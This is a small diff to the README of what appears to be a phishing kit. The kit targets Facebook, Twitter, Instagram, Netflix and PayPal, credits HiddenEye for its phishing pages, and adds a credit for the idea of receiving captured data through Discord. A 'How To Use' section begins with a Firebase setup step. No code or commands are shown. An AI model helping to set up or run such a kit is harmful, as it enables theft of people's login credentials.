@@ -16,7 +16,7 @@ FACEBOOK | TWITTER | INSTAGRAM | NETFLIX | PAYPAL
 
 ## CREDITS
 * HiddenEye ( For there Phishing Pages ) 
-* [GraySuit](https://github.com/graysuit) 
+* [GraySuit](https://github.com/graysuit) (For the idea of receiving data through Discord)
 
 ## How To Use
  1. After Creating a Firebase Project Create a new Web app.
